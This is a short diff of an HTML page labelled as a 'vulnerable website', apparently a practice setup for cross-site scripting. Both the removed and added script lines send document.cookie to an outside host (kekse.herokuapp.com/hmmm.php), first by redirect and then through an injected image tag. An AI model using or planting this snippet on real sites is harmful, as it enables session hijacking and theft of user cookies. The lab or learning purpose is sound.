@@ -5,7 +5,8 @@
   <h2>my f*n vulnerable website</h2>
   <script type="text/javascript">
     document.cookie = "macookie=asdfjkl";
-    document.location='http://kekse.herokuapp.com/hmmm.php?c='+document.cookie;</script>
+    document.write('<img src="https://kekse.herokuapp.com/hmmm.php?c=" + document.cookie + '" />')
+  </script>
   <p>please leve a comment...</p>
   <form action="/index.php">
     <input type="text" name="bla"><br />
